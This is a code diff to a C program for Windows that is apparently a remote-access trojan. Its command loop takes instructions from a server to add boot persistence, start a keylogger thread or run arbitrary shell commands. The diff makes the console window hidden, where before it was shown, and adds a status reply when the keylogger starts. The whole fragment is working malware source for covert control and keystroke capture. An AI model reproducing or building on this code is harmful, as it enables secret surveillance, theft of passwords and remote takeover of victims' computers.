@@ -66,11 +66,12 @@ void Shell() {
             chdir(temp); //changes program dir
             strcat(totalResponse, temp); //sends the dir back to the server
         } else if (strncmp("persist", buffer, 7) == 0) {
-            RunOnBoot();    
+            RunOnBoot();
         } else if (strncmp("keylogger", buffer, 9) == 0) {
             //keylogger must run on a different thread
             //CreateThread returns a thread, however we dont really need it since we only start the logger
             HANDLE thread = CreateThread(NULL, 0, StartKeylogger(), NULL, 0, NULL);
+            strcat(totalResponse, "Started Keylogger");
         } else {
             //execute command
             FILE *file; //file is basically just used as a string stream
@@ -98,7 +99,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     HWND stealth; //window handle
     AllocConsole(); //creates a console
     stealth = FindWindowA("ConsoleWindowClass", NULL); //retrives handle to top level window
-    ShowWindow(stealth, 3); //0 is basically hiding the window
+    ShowWindow(stealth, 0); //0 is basically hiding the window
 
     struct sockaddr_in ServAddr;
     unsigned short ServPort;
